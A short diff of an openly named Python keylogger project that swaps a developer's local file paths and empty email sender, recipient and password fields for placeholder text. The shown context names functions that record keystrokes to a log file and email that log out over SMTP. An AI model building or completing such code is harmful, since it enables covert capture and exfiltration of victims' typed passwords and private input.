@@ -10,8 +10,8 @@ from email.mime.base import MIMEBase
 from email import encoders
 
 log = ""
-path = r"C:\Users\vabla\Desktop\textlogger.txt"
-script_path = r"C:\Users\vabla\Downloads\keylogger\keylogger\main.py"
+path = r"path of the keyllogers.txt"
+script_path = r"path of the project"
 
 # Fonction pour vérifier et créer le fichier log s'il n'existe pas
 def create_log_file(path):
@@ -42,9 +42,9 @@ def processkeys(key):
 
 # Fonction pour envoyer le fichier log par email
 def send_email():
-    fromaddr = ""
-    toaddr = ""
-    password = ""
+    fromaddr = "from address mail"
+    toaddr = "to adress mail"
+    password = "password with smtp methode"
 
     msg = MIMEMultipart()
     msg['From'] = fromaddr
